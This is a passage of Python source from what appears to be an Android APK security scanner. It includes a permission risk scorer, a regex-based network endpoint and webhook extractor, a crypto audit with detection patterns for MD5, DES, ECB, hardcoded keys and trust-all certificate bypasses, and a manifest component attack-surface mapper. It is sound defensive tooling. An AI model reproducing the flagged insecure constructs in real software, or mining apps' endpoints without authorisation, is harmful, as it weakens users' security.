        if all(p in permission_names for p in combo["permissions"]):
            dangerous_combinations.append({
                "permissions": combo["permissions"],
                "risk": combo["risk"],
                "description": combo["description"]
            })
    
    # Calculate risk score
    risk_score = 0
    risk_score += len(by_level["signature"]) * 25  # Signature perms are highest risk
    risk_score += len(by_level["dangerous"]) * 10
    risk_score += len(dangerous_combinations) * 15
    risk_score = min(risk_score, 100)  # Cap at 100
    
    # Determine overall risk level
    if risk_score >= 70 or len(by_level["signature"]) >= 2:
        overall_risk = "critical"
    elif risk_score >= 50 or len(by_level["dangerous"]) >= 5:
        overall_risk = "high"
    elif risk_score >= 25 or len(by_level["dangerous"]) >= 2:
        overall_risk = "medium"
    else:
        overall_risk = "low"
    
    # Generate summary
    summary_parts = []
    if by_level["signature"]:
        summary_parts.append(f" {len(by_level['signature'])} system/signature permissions")
    if by_level["dangerous"]:
        summary_parts.append(f" {len(by_level['dangerous'])} dangerous permissions")
    if dangerous_combinations:
        summary_parts.append(f" {len(dangerous_combinations)} risky permission combinations")
    
    return {
        "total_permissions": len(permissions),
        "permissions": permissions,
        "by_level": by_level,
        "by_category": by_category,
        "dangerous_combinations": dangerous_combinations,
        "risk_score": risk_score,
        "overall_risk": overall_risk,
        "summary": " | ".join(summary_parts) if summary_parts else " Low-risk permission profile"
    }


# ============================================================================
# Feature: Network Endpoint Extractor
# ============================================================================

# Patterns for network endpoint extraction
NETWORK_PATTERNS = {
    # URLs
    "url_https": r'https://[^\s"\'<>)\]]+',
    "url_http": r'http://[^\s"\'<>)\]]+',
    
    # IP addresses
    "ipv4": r'\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b',
    "ipv4_port": r'\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?):\d{1,5}\b',
    
    # Domains (more specific patterns)
    "api_domain": r'["\']([a-zA-Z0-9][-a-zA-Z0-9]*\.)+[a-zA-Z]{2,}["\']',
    
    # API patterns
    "api_path": r'/api/v?\d*[/\w\-\.]+',
    "rest_endpoint": r'/(?:api|rest|v\d+|graphql|query|mutation)/[\w\-/\.]+',
    
    # WebSocket
    "websocket": r'wss?://[^\s"\'<>)\]]+',
    
    # Firebase
    "firebase_url": r'https://[\w\-]+\.firebaseio\.com[^\s"\'<>)\]]*',
    "firebase_storage": r'gs://[\w\-\.]+',
    "firebase_config": r'[\w\-]+\.firebaseapp\.com',
    
    # AWS
    "aws_s3": r's3://[\w\-\.]+',
    "aws_s3_url": r'https://[\w\-]+\.s3[\.\-][\w\-]+\.amazonaws\.com[^\s"\'<>)\]]*',
    "aws_api_gateway": r'https://[\w]+\.execute-api\.[\w\-]+\.amazonaws\.com[^\s"\'<>)\]]*',
    "aws_lambda": r'https://[\w]+\.lambda-url\.[\w\-]+\.on\.aws[^\s"\'<>)\]]*',
    
    # Azure
    "azure_blob": r'https://[\w]+\.blob\.core\.windows\.net[^\s"\'<>)\]]*',
    "azure_api": r'https://[\w\-]+\.azure-api\.net[^\s"\'<>)\]]*',
    
    # Google Cloud
    "gcp_storage": r'https://storage\.googleapis\.com/[\w\-]+[^\s"\'<>)\]]*',
    "gcp_functions": r'https://[\w\-]+\.cloudfunctions\.net[^\s"\'<>)\]]*',
    
    # Common API services
    "stripe_api": r'https://api\.stripe\.com[^\s"\'<>)\]]*',
    "twilio_api": r'https://api\.twilio\.com[^\s"\'<>)\]]*',
    "sendgrid_api": r'https://api\.sendgrid\.com[^\s"\'<>)\]]*',
    "slack_webhook": r'https://hooks\.slack\.com/[\w/]+',
    "discord_webhook": r'https://discord(?:app)?\.com/api/webhooks/[\w/]+',
    
    # GraphQL
    "graphql_endpoint": r'/graphql(?:/[\w\-]+)?',
}

# Categories for endpoints
ENDPOINT_CATEGORIES = {
    "url_https": "https_url",
    "url_http": "http_url",
    "ipv4": "ip_address",
    "ipv4_port": "ip_address",
    "api_domain": "domain",
    "api_path": "api_endpoint",
    "rest_endpoint": "api_endpoint",
    "websocket": "websocket",
    "firebase_url": "firebase",
    "firebase_storage": "firebase",
    "firebase_config": "firebase",
    "aws_s3": "aws",
    "aws_s3_url": "aws",
    "aws_api_gateway": "aws",
    "aws_lambda": "aws",
    "azure_blob": "azure",
    "azure_api": "azure",
    "gcp_storage": "gcp",
    "gcp_functions": "gcp",
    "stripe_api": "payment_service",
    "twilio_api": "communication_service",
    "sendgrid_api": "email_service",
    "slack_webhook": "webhook",
    "discord_webhook": "webhook",
    "graphql_endpoint": "graphql",
}

# Risk levels for endpoint types
ENDPOINT_RISKS = {
    "http_url": "high",  # Unencrypted
    "ip_address": "medium",  # Hardcoded IPs
    "webhook": "high",  # Sensitive webhooks
    "firebase": "medium",
    "aws": "medium",
    "azure": "medium",
    "gcp": "medium",
    "payment_service": "high",
    "https_url": "low",
    "api_endpoint": "low",
    "websocket": "low",
    "domain": "low",
    "graphql": "low",
    "communication_service": "medium",
    "email_service": "medium",
}

# Domains to exclude (common SDK/library domains)
EXCLUDED_DOMAINS = {
    "schemas.android.com",
    "www.w3.org",
    "ns.adobe.com",
    "xmlpull.org",
    "json.org",
    "apache.org",
    "google.com",  # Generic google
    "googleapis.com",  # Generic APIs
    "gstatic.com",
    "googleusercontent.com",
    "android.com",
    "example.com",
    "localhost",
    "127.0.0.1",
    "0.0.0.0",
}


def extract_network_endpoints(output_dir: Path) -> Dict[str, Any]:
    """
    Extract all network endpoints from decompiled sources.
    
    Args:
        output_dir: JADX output directory
    
    Returns:
        Dictionary with extracted endpoints and analysis
    """
    output_dir = Path(output_dir)
    sources_dir = output_dir / "sources"
    
    if not sources_dir.exists():
        return {"error": "Decompiled sources not found"}
    
    endpoints = []
    seen = set()  # Deduplicate
    
    # Process all source files
    for java_file in sources_dir.rglob("*.java"):
        try:
            content = java_file.read_text(encoding='utf-8', errors='ignore')
            rel_path = str(java_file.relative_to(sources_dir))
            
            # Search for each pattern
            for pattern_name, pattern in NETWORK_PATTERNS.items():
                for match in re.finditer(pattern, content, re.IGNORECASE):
                    value = match.group(0).strip('"\'')
                    
                    # Skip if already seen
                    if value in seen:
                        continue
                    
                    # Skip excluded domains
                    skip = False
                    for excluded in EXCLUDED_DOMAINS:
                        if excluded in value.lower():
                            skip = True
                            break
                    if skip:
                        continue
                    
                    # Skip very short matches
                    if len(value) < 8:
                        continue
                    
                    seen.add(value)
                    
                    category = ENDPOINT_CATEGORIES.get(pattern_name, "other")
                    risk = ENDPOINT_RISKS.get(category, "low")
                    
                    # Find line number
                    line_num = content[:match.start()].count('\n') + 1
                    
                    endpoints.append({
                        "value": value,
                        "type": pattern_name,
                        "category": category,
                        "risk": risk,
                        "file": rel_path,
                        "line": line_num
                    })
        except Exception as e:
            continue
    
    # Also search in resources (strings.xml, etc.)
    resources_dir = output_dir / "resources"
    if resources_dir.exists():
        for xml_file in resources_dir.rglob("*.xml"):
            try:
                content = xml_file.read_text(encoding='utf-8', errors='ignore')
                rel_path = f"resources/{xml_file.relative_to(resources_dir)}"
                
                for pattern_name, pattern in NETWORK_PATTERNS.items():
                    for match in re.finditer(pattern, content, re.IGNORECASE):
                        value = match.group(0).strip('"\'')
                        
                        if value in seen:
                            continue
                        
                        skip = False
                        for excluded in EXCLUDED_DOMAINS:
                            if excluded in value.lower():
                                skip = True
                                break
                        if skip:
                            continue
                        
                        if len(value) < 8:
                            continue
                        
                        seen.add(value)
                        
                        category = ENDPOINT_CATEGORIES.get(pattern_name, "other")
                        risk = ENDPOINT_RISKS.get(category, "low")
                        line_num = content[:match.start()].count('\n') + 1
                        
                        endpoints.append({
                            "value": value,
                            "type": pattern_name,
                            "category": category,
                            "risk": risk,
                            "file": rel_path,
                            "line": line_num
                        })
            except:
                continue
    
    # Sort by risk then value
    risk_order = {"high": 0, "medium": 1, "low": 2}
    endpoints.sort(key=lambda e: (risk_order.get(e["risk"], 3), e["value"]))
    
    # Categorize results
    by_category = {}
    by_risk = {"high": [], "medium": [], "low": []}
    
    for ep in endpoints:
        cat = ep["category"]
        if cat not in by_category:
            by_category[cat] = []
        by_category[cat].append(ep)
        
        risk = ep["risk"]
        if risk in by_risk:
            by_risk[risk].append(ep)
    
    # Find unique domains
    domains = set()
    for ep in endpoints:
        if "://" in ep["value"]:
            try:
                from urllib.parse import urlparse
                parsed = urlparse(ep["value"])
                if parsed.netloc:
                    domains.add(parsed.netloc)
            except:
                pass
    
    # Generate summary
    summary_parts = []
    if by_risk["high"]:
        summary_parts.append(f" {len(by_risk['high'])} high-risk endpoints")
    if by_risk["medium"]:
        summary_parts.append(f" {len(by_risk['medium'])} medium-risk")
    if any("http_url" in ep["type"] for ep in endpoints):
        summary_parts.append(" HTTP (unencrypted) URLs found")
    if any(ep["category"] == "webhook" for ep in endpoints):
        summary_parts.append(" Webhooks detected")
    
    return {
        "total_endpoints": len(endpoints),
        "endpoints": endpoints,
        "by_category": by_category,
        "by_risk": by_risk,
        "unique_domains": sorted(list(domains)),
        "domain_count": len(domains),
        "summary": " | ".join(summary_parts) if summary_parts else " No high-risk network endpoints found"
    }


# ============================================================================
# Feature: Crypto Audit
# ============================================================================

# Weak crypto algorithms that should be flagged
WEAK_CRYPTO_PATTERNS = {
    # Weak hashing algorithms
    "md5": {
        "patterns": [
            r'MessageDigest\.getInstance\s*\(\s*["\']MD5["\']\s*\)',
            r'\.md5\s*\(',
            r'MD5\.digest',
            r'DigestUtils\.md5',
            r'Hashing\.md5\s*\(',
        ],
        "severity": "high",
        "category": "weak_hash",
        "description": "MD5 is cryptographically broken and should not be used for security purposes",
        "recommendation": "Use SHA-256 or SHA-3 instead of MD5"
    },
    "sha1": {
        "patterns": [
            r'MessageDigest\.getInstance\s*\(\s*["\']SHA-?1["\']\s*\)',
            r'\.sha1\s*\(',
            r'SHA1\.digest',
            r'DigestUtils\.sha1',
            r'Hashing\.sha1\s*\(',
        ],
        "severity": "medium",
        "category": "weak_hash",
        "description": "SHA-1 is deprecated and vulnerable to collision attacks",
        "recommendation": "Use SHA-256 or SHA-3 instead of SHA-1"
    },
    
    # Weak encryption algorithms
    "des": {
        "patterns": [
            r'Cipher\.getInstance\s*\(\s*["\']DES[^E]',
            r'DESKeySpec',
            r'DES/ECB',
            r'DES/CBC',
            r'SecretKeyFactory\.getInstance\s*\(\s*["\']DES["\']\s*\)',
        ],
        "severity": "critical",
        "category": "weak_encryption",
        "description": "DES is obsolete with only 56-bit key strength",
        "recommendation": "Use AES-256 instead of DES"
    },
    "3des": {
        "patterns": [
            r'Cipher\.getInstance\s*\(\s*["\']DESede',
            r'DESedeKeySpec',
            r'TripleDES',
            r'3DES',
        ],
        "severity": "medium",
        "category": "weak_encryption",
        "description": "3DES is deprecated with known vulnerabilities",
        "recommendation": "Use AES-256 instead of 3DES"
    },
    "rc4": {
        "patterns": [
            r'Cipher\.getInstance\s*\(\s*["\']RC4',
            r'ARCFOUR',
            r'RC4/None',
        ],
        "severity": "critical",
        "category": "weak_encryption",
        "description": "RC4 has critical vulnerabilities and is prohibited in TLS",
        "recommendation": "Use AES-GCM instead of RC4"
    },
    "blowfish": {
        "patterns": [
            r'Cipher\.getInstance\s*\(\s*["\']Blowfish',
        ],
        "severity": "low",
        "category": "weak_encryption",
        "description": "Blowfish has a 64-bit block size which may be vulnerable",
        "recommendation": "Consider using AES-256 for new implementations"
    },
    
    # ECB mode (insecure)
    "ecb_mode": {
        "patterns": [
            r'Cipher\.getInstance\s*\(\s*["\'][A-Z0-9]+/ECB/',
            r'/ECB/PKCS[57]Padding',
            r'/ECB/NoPadding',
        ],
        "severity": "high",
        "category": "insecure_mode",
        "description": "ECB mode does not provide semantic security - identical plaintext blocks produce identical ciphertext",
        "recommendation": "Use CBC, CTR, or GCM mode instead of ECB"
    },
    
    # Hardcoded keys and IVs
    "hardcoded_key": {
        "patterns": [
            r'SecretKeySpec\s*\(\s*["\'][^"\']+["\']\.getBytes\(',
            r'SecretKeySpec\s*\(\s*new\s+byte\s*\[\s*\]\s*\{[^}]+\}',
            r'\.getBytes\s*\(\s*\)\s*,\s*["\']AES["\']\s*\)',
            r'IvParameterSpec\s*\(\s*["\'][^"\']+["\']\.getBytes\(',
            r'IvParameterSpec\s*\(\s*new\s+byte\s*\[\s*\]\s*\{[^}]+\}',
        ],
        "severity": "critical",
        "category": "hardcoded_secret",
        "description": "Cryptographic keys or IVs appear to be hardcoded in source code",
        "recommendation": "Store keys securely using Android Keystore or secure key derivation"
    },
    
    # Static IVs
    "static_iv": {
        "patterns": [
            r'new\s+byte\s*\[\s*\]\s*\{\s*0\s*,\s*0\s*,\s*0',
            r'IvParameterSpec\s*\(\s*["\'][0]+["\']\s*\)',
            r'IV\s*=\s*["\'][^"\']{16,}["\']',
        ],
        "severity": "high",
        "category": "static_iv",
        "description": "Static or null IVs compromise encryption security",
        "recommendation": "Generate a random IV for each encryption operation"
    },
    
    # Insecure random
    "insecure_random": {
        "patterns": [
            r'new\s+Random\s*\(',
            r'java\.util\.Random',
            r'Math\.random\s*\(',
        ],
        "severity": "medium",
        "category": "weak_random",
        "description": "java.util.Random is not cryptographically secure",
        "recommendation": "Use SecureRandom for cryptographic purposes"
    },
    
    # No padding
    "no_padding": {
        "patterns": [
            r'Cipher\.getInstance\s*\(\s*["\'][A-Z0-9]+/[A-Z]+/NoPadding',
        ],
        "severity": "medium",
        "category": "insecure_padding",
        "description": "NoPadding may be vulnerable to padding oracle attacks",
        "recommendation": "Use proper padding like PKCS7 or use authenticated encryption (GCM)"
    },
    
    # RSA without OAEP
    "rsa_pkcs1": {
        "patterns": [
            r'Cipher\.getInstance\s*\(\s*["\']RSA/[^/]*/PKCS1Padding',
            r'Cipher\.getInstance\s*\(\s*["\']RSA["\']\s*\)',
        ],
        "severity": "medium",
        "category": "weak_rsa",
        "description": "RSA with PKCS#1 v1.5 padding is vulnerable to attacks",
        "recommendation": "Use RSA with OAEP padding"
    },
    
    # Short key lengths
    "short_rsa_key": {
        "patterns": [
            r'KeyPairGenerator\.getInstance\s*\([^)]+\)\s*;\s*[^;]*\.initialize\s*\(\s*(?:512|768|1024)\s*[,)]',
        ],
        "severity": "high",
        "category": "weak_key_length",
        "description": "RSA keys shorter than 2048 bits are considered weak",
        "recommendation": "Use at least 2048-bit RSA keys, preferably 4096"
    },
    
    # Password-based encryption with weak iteration
    "weak_pbkdf": {
        "patterns": [
            r'PBEKeySpec\s*\([^,]+,\s*[^,]+,\s*(?:1|[0-9]{1,3})\s*[,)]',
            r'\.setIterationCount\s*\(\s*(?:1|[0-9]{1,3})\s*\)',
        ],
        "severity": "high",
        "category": "weak_kdf",
        "description": "Password-based key derivation with low iteration count",
        "recommendation": "Use at least 100,000 iterations for PBKDF2"
    },
    
    # Certificate pinning bypass potential
    "cert_pinning_bypass": {
        "patterns": [
            r'TrustManager\s*\[\s*\]\s*\{\s*new\s+X509TrustManager',
            r'checkServerTrusted.*\{\s*\}',
            r'getAcceptedIssuers.*return\s+null',
            r'trustAllCerts',
            r'ALLOW_ALL_HOSTNAME_VERIFIER',
            r'\.setHostnameVerifier\s*\(\s*SSLSocketFactory\.ALLOW_ALL',
        ],
        "severity": "critical",
        "category": "certificate_validation",
        "description": "Certificate validation appears to be disabled or bypassed",
        "recommendation": "Implement proper certificate pinning and validation"
    },
}

# Good crypto practices to highlight
GOOD_CRYPTO_PATTERNS = {
    "secure_random": [r'SecureRandom', r'new\s+SecureRandom\s*\('],
    "aes_gcm": [r'/GCM/', r'AES/GCM'],
    "sha256": [r'SHA-?256', r'MessageDigest\.getInstance\s*\(\s*["\']SHA-256'],
    "sha512": [r'SHA-?512', r'MessageDigest\.getInstance\s*\(\s*["\']SHA-512'],
    "keystore": [r'KeyStore\.getInstance', r'AndroidKeyStore'],
    "bcrypt": [r'BCrypt', r'bcrypt'],
    "argon2": [r'Argon2', r'argon2'],
}


def crypto_audit(output_dir: Path) -> Dict[str, Any]:
    """
    Perform a comprehensive cryptographic audit on decompiled APK sources.
    
    Args:
        output_dir: JADX output directory
    
    Returns:
        Dictionary with audit results, findings, and recommendations
    """
    output_dir = Path(output_dir)
    sources_dir = output_dir / "sources"
    
    if not sources_dir.exists():
        return {"error": "Decompiled sources not found"}
    
    findings = []
    good_practices = []
    crypto_methods = []  # Track all crypto usage for overview
    files_scanned = 0
    
    # Scan all Java source files
    for java_file in sources_dir.rglob("*.java"):
        try:
            content = java_file.read_text(encoding='utf-8', errors='ignore')
            rel_path = str(java_file.relative_to(sources_dir))
            files_scanned += 1
            
            # Check for weak patterns
            for vuln_name, vuln_info in WEAK_CRYPTO_PATTERNS.items():
                for pattern in vuln_info["patterns"]:
                    for match in re.finditer(pattern, content, re.IGNORECASE | re.MULTILINE):
                        line_num = content[:match.start()].count('\n') + 1
                        
                        # Get context (surrounding lines)
                        lines = content.split('\n')
                        start_line = max(0, line_num - 3)
                        end_line = min(len(lines), line_num + 2)
                        context = '\n'.join(lines[start_line:end_line])
                        
                        findings.append({
                            "type": vuln_name,
                            "category": vuln_info["category"],
                            "severity": vuln_info["severity"],
                            "description": vuln_info["description"],
                            "recommendation": vuln_info["recommendation"],
                            "file": rel_path,
                            "line": line_num,
                            "match": match.group(0)[:100],  # Truncate long matches
                            "context": context[:500],  # Truncate context
                        })
            
            # Check for good practices
            for practice_name, patterns in GOOD_CRYPTO_PATTERNS.items():
                for pattern in patterns:
                    for match in re.finditer(pattern, content, re.IGNORECASE):
                        line_num = content[:match.start()].count('\n') + 1
                        good_practices.append({
                            "type": practice_name,
                            "file": rel_path,
                            "line": line_num,
                            "match": match.group(0)[:50]
                        })
            
            # Track crypto API usage for overview
            crypto_api_patterns = [
                (r'Cipher\.getInstance', "encryption"),
                (r'MessageDigest\.getInstance', "hashing"),
                (r'KeyGenerator\.getInstance', "key_generation"),
                (r'KeyPairGenerator\.getInstance', "asymmetric_key"),
                (r'Mac\.getInstance', "mac"),
                (r'Signature\.getInstance', "digital_signature"),
                (r'KeyStore\.getInstance', "keystore"),
                (r'SecretKeyFactory\.getInstance', "key_derivation"),
            ]
            
            for pattern, usage_type in crypto_api_patterns:
                for match in re.finditer(pattern, content):
                    line_num = content[:match.start()].count('\n') + 1
                    # Try to extract algorithm name
                    algo_match = re.search(r'\(\s*["\']([^"\']+)["\']\s*\)', content[match.start():match.start()+100])
                    algorithm = algo_match.group(1) if algo_match else "unknown"
                    
                    crypto_methods.append({
                        "type": usage_type,
                        "algorithm": algorithm,
                        "file": rel_path,
                        "line": line_num
                    })
        
        except Exception as e:
            continue
    
    # Deduplicate findings (same type + file + line)
    seen_findings = set()
    unique_findings = []
    for f in findings:
        key = (f["type"], f["file"], f["line"])
        if key not in seen_findings:
            seen_findings.add(key)
            unique_findings.append(f)
    findings = unique_findings
    
    # Sort findings by severity
    severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
    findings.sort(key=lambda f: (severity_order.get(f["severity"], 4), f["file"]))
    
    # Categorize findings
    by_severity = {"critical": [], "high": [], "medium": [], "low": []}
    by_category = {}
    
    for finding in findings:
        sev = finding["severity"]
        if sev in by_severity:
            by_severity[sev].append(finding)
        
        cat = finding["category"]
        if cat not in by_category:
            by_category[cat] = []
        by_category[cat].append(finding)
    
    # Calculate risk score
    risk_score = 0
    risk_score += len(by_severity["critical"]) * 30
    risk_score += len(by_severity["high"]) * 15
    risk_score += len(by_severity["medium"]) * 5
    risk_score += len(by_severity["low"]) * 1
    risk_score = min(risk_score, 100)  # Cap at 100
    
    # Determine overall grade
    if risk_score >= 70:
        grade = "F"
        overall_risk = "critical"
    elif risk_score >= 50:
        grade = "D"
        overall_risk = "high"
    elif risk_score >= 30:
        grade = "C"
        overall_risk = "medium"
    elif risk_score >= 10:
        grade = "B"
        overall_risk = "low"
    else:
        grade = "A"
        overall_risk = "minimal"
    
    # Generate summary
    summary_parts = []
    if by_severity["critical"]:
        summary_parts.append(f" {len(by_severity['critical'])} critical issues")
    if by_severity["high"]:
        summary_parts.append(f" {len(by_severity['high'])} high-risk issues")
    if by_severity["medium"]:
        summary_parts.append(f" {len(by_severity['medium'])} medium issues")
    if good_practices:
        summary_parts.append(f" {len(set(p['type'] for p in good_practices))} good practices found")
    
    # Generate recommendations
    top_recommendations = []
    if by_category.get("hardcoded_secret"):
        top_recommendations.append("Move cryptographic keys to Android Keystore or use secure key derivation")
    if by_category.get("weak_hash"):
        top_recommendations.append("Replace MD5/SHA-1 with SHA-256 or SHA-3")
    if by_category.get("weak_encryption"):
        top_recommendations.append("Upgrade from DES/3DES/RC4 to AES-256-GCM")
    if by_category.get("insecure_mode"):
        top_recommendations.append("Use authenticated encryption modes (GCM) instead of ECB")
    if by_category.get("certificate_validation"):
        top_recommendations.append("Implement proper certificate validation and pinning")
    if by_category.get("weak_random"):
        top_recommendations.append("Use SecureRandom instead of java.util.Random for cryptographic purposes")
    
    return {
        "total_findings": len(findings),
        "findings": findings,
        "by_severity": by_severity,
        "by_category": by_category,
        "good_practices": good_practices[:50],  # Limit
        "crypto_methods": crypto_methods[:100],  # Limit
        "files_scanned": files_scanned,
        "risk_score": risk_score,
        "grade": grade,
        "overall_risk": overall_risk,
        "top_recommendations": top_recommendations[:5],
        "summary": " | ".join(summary_parts) if summary_parts else " No cryptographic issues detected"
    }


# ============================================================================
# Feature: Activity/Service Map (Component Map)
# ============================================================================

def generate_component_map(output_dir: Path) -> Dict[str, Any]:
    """
    Generate a visual component map showing activities, services, receivers,
    providers and their relationships (intents, exports, etc.)
    
    Args:
        output_dir: JADX output directory
    
    Returns:
        Dictionary with component map data for visualization
    """
    output_dir = Path(output_dir)
    resources_dir = output_dir / "resources"
    sources_dir = output_dir / "sources"
    
    # Find AndroidManifest.xml
    manifest_path = None
    for candidate in [
        resources_dir / "AndroidManifest.xml",
        output_dir / "AndroidManifest.xml",
    ]:
        if candidate.exists():
            manifest_path = candidate
            break
    
    if not manifest_path:
        return {"error": "AndroidManifest.xml not found"}
    
    try:
        from defusedxml import ElementTree as ET  # Use defusedxml to prevent XXE attacks
        tree = ET.parse(manifest_path)
        root = tree.getroot()
        
        # Handle Android namespace
        ns = {"android": "http://schemas.android.com/apk/res/android"}
        
        def get_attr(elem, attr):
            """Get attribute with Android namespace."""
            return elem.get(f"{{{ns['android']}}}{attr}", elem.get(attr, ""))
        
        # Extract package name
        package_name = root.get("package", "unknown")
        
        # Component containers
        components = {
            "activities": [],
            "services": [],
            "receivers": [],
            "providers": [],
        }
        
        # Intent filter relationships
        intent_connections = []
        deep_links = []
        
        # Find application element
        app_elem = root.find("application")
        if app_elem is None:
            return {"error": "No application element in manifest"}
        
        # Process activities
        for activity in app_elem.findall("activity"):
            name = get_attr(activity, "name")
            if name.startswith("."):
                name = package_name + name
            
            exported = get_attr(activity, "exported")
            is_exported = exported.lower() == "true"
            
            # Check if it has intent filters (implicitly exported if no explicit export)
            intent_filters = activity.findall("intent-filter")
            if intent_filters and exported == "":
                is_exported = True
            
            # Determine if it's a launcher activity
            is_launcher = False
            actions = []
            categories = []
            data_schemes = []
            
            for intent_filter in intent_filters:
                for action in intent_filter.findall("action"):
                    action_name = get_attr(action, "name")
                    actions.append(action_name)
                    if action_name == "android.intent.action.MAIN":
                        for cat in intent_filter.findall("category"):
                            if get_attr(cat, "name") == "android.intent.category.LAUNCHER":
                                is_launcher = True
                
                for category in intent_filter.findall("category"):
                    categories.append(get_attr(category, "name"))
                
                for data in intent_filter.findall("data"):
                    scheme = get_attr(data, "scheme")
                    host = get_attr(data, "host")
                    path = get_attr(data, "path") or get_attr(data, "pathPrefix") or get_attr(data, "pathPattern")
                    if scheme:
                        deep_link = f"{scheme}://{host or '*'}{path or ''}"
                        data_schemes.append(scheme)
                        deep_links.append({
                            "scheme": scheme,
                            "host": host,
                            "path": path,
                            "component": name.split(".")[-1],
                            "component_full": name,
                            "type": "activity"
                        })
            
            # Risk assessment
            risk = "low"
            if is_exported and not is_launcher:
                risk = "medium"
                if actions and any("BROWSABLE" in c for c in categories):
                    risk = "high"  # Deep link exposed
            
            components["activities"].append({
                "name": name.split(".")[-1],
                "full_name": name,
                "exported": is_exported,
                "launcher": is_launcher,
                "actions": actions,
                "categories": categories,
                "data_schemes": data_schemes,
                "risk": risk,
                "theme": get_attr(activity, "theme"),
                "launch_mode": get_attr(activity, "launchMode") or "standard",
            })
        
        # Process services
        for service in app_elem.findall("service"):
            name = get_attr(service, "name")
            if name.startswith("."):
                name = package_name + name
            
            exported = get_attr(service, "exported")
            intent_filters = service.findall("intent-filter")
            is_exported = exported.lower() == "true" or (intent_filters and exported == "")
            
            actions = []
            for intent_filter in intent_filters:
                for action in intent_filter.findall("action"):
                    actions.append(get_attr(action, "name"))
            
            # Check for bound service patterns
            permission = get_attr(service, "permission")
            
            risk = "low"
            if is_exported:
                risk = "medium" if permission else "high"
            
            components["services"].append({
                "name": name.split(".")[-1],
                "full_name": name,
                "exported": is_exported,
                "actions": actions,
                "permission": permission,
                "foreground": get_attr(service, "foregroundServiceType") != "",
                "risk": risk,
            })
        
        # Process receivers
        for receiver in app_elem.findall("receiver"):
            name = get_attr(receiver, "name")
            if name.startswith("."):
                name = package_name + name
            
            exported = get_attr(receiver, "exported")
            intent_filters = receiver.findall("intent-filter")
            is_exported = exported.lower() == "true" or (intent_filters and exported == "")
            
            actions = []
            for intent_filter in intent_filters:
                for action in intent_filter.findall("action"):
                    actions.append(get_attr(action, "name"))
            
            permission = get_attr(receiver, "permission")
            
            # System broadcast check
            is_system = any("android.intent.action" in a for a in actions)
            
            risk = "low"
            if is_exported and not is_system:
                risk = "medium" if permission else "high"
            
            components["receivers"].append({
                "name": name.split(".")[-1],
                "full_name": name,
                "exported": is_exported,
                "actions": actions,
                "permission": permission,
                "system_broadcast": is_system,
                "risk": risk,
            })
        
        # Process providers
        for provider in app_elem.findall("provider"):
            name = get_attr(provider, "name")
            if name.startswith("."):
                name = package_name + name
            
            exported = get_attr(provider, "exported")
            # Providers default to exported=true if targetSdk < 17
            is_exported = exported.lower() != "false"
            
            authorities = get_attr(provider, "authorities")
            read_perm = get_attr(provider, "readPermission")
            write_perm = get_attr(provider, "writePermission")
            grant_uri = get_attr(provider, "grantUriPermissions")
            
            risk = "low"
            if is_exported:
                if not read_perm and not write_perm:
                    risk = "critical"
                elif not read_perm or not write_perm:
                    risk = "high"
                else:
                    risk = "medium"
            
            components["providers"].append({
                "name": name.split(".")[-1],
                "full_name": name,
                "exported": is_exported,
                "authorities": authorities,
                "read_permission": read_perm,
                "write_permission": write_perm,
                "grant_uri_permissions": grant_uri.lower() == "true",
                "risk": risk,
            })
        
        # Analyze inter-component connections from source code
        connections = []
        if sources_dir.exists():
            # Patterns for finding component invocations
            intent_patterns = [
                r'new\s+Intent\s*\(\s*[^,]+,\s*(\w+)\.class\s*\)',
                r'Intent\s*\(\s*[^,]+,\s*(\w+)\.class\s*\)',
                r'startActivity\s*\([^)]*(\w+)\.class',
                r'startService\s*\([^)]*(\w+)\.class',
                r'bindService\s*\([^)]*(\w+)\.class',
                r'startActivityForResult\s*\([^)]*(\w+)\.class',
            ]
            
            for java_file in list(sources_dir.rglob("*.java"))[:200]:  # Limit for performance
                try:
                    content = java_file.read_text(encoding='utf-8', errors='ignore')
                    source_name = java_file.stem
                    
                    for pattern in intent_patterns:
                        for match in re.finditer(pattern, content):
                            target = match.group(1)
                            if target != source_name:  # Skip self-references
                                connections.append({
                                    "source": source_name,
                                    "target": target,
                                    "type": "intent"
                                })
                except:
                    continue
        
        # Deduplicate connections
        seen = set()
        unique_connections = []
        for conn in connections:
            key = (conn["source"], conn["target"])
            if key not in seen:
                seen.add(key)
                unique_connections.append(conn)
        
        # Statistics
        stats = {
            "total_activities": len(components["activities"]),
            "total_services": len(components["services"]),
            "total_receivers": len(components["receivers"]),
            "total_providers": len(components["providers"]),
            "exported_activities": len([a for a in components["activities"] if a["exported"]]),
            "exported_services": len([s for s in components["services"] if s["exported"]]),
            "exported_receivers": len([r for r in components["receivers"] if r["exported"]]),
            "exported_providers": len([p for p in components["providers"] if p["exported"]]),
            "deep_links": len(deep_links),
            "connections": len(unique_connections),
        }
        
        # Risk summary
        all_components = (
            components["activities"] + 
            components["services"] + 
            components["receivers"] + 
            components["providers"]
        )
        
        risk_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0}
        for comp in all_components:
            risk_counts[comp.get("risk", "low")] += 1
        
        # Calculate attack surface score
        attack_surface_score = 0
        attack_surface_score += stats["exported_activities"] * 5
        attack_surface_score += stats["exported_services"] * 10
        attack_surface_score += stats["exported_receivers"] * 3
        attack_surface_score += stats["exported_providers"] * 15
        attack_surface_score += len(deep_links) * 8
        attack_surface_score = min(attack_surface_score, 100)
        
        return {
            "package_name": package_name,
            "components": components,
            "connections": unique_connections,
            "deep_links": deep_links,
            "stats": stats,
            "risk_counts": risk_counts,
            "attack_surface_score": attack_surface_score,
            "summary": f" {stats['total_activities']} activities, {stats['total_services']} services, {stats['total_receivers']} receivers, {stats['total_providers']} providers |  {sum([stats['exported_activities'], stats['exported_services'], stats['exported_receivers'], stats['exported_providers']])} exported |  {len(deep_links)} deep links"
        }
        
    except Exception as e:
        return {"error": f"Failed to parse manifest: {str(e)}"}


# ============================================================================
# Feature: Jump to Definition (Symbol Lookup)
# ============================================================================

def build_symbol_index(output_dir: Path) -> Dict[str, Any]:
    """
    Build an index of all class and method definitions for jump-to-definition.
    
    Args:
        output_dir: JADX output directory
    
    Returns:
        Dictionary with symbol index
    """
    output_dir = Path(output_dir)
    sources_dir = output_dir / "sources"
    
    if not sources_dir.exists():
        return {"error": "Decompiled sources not found"}
    
    symbols = {
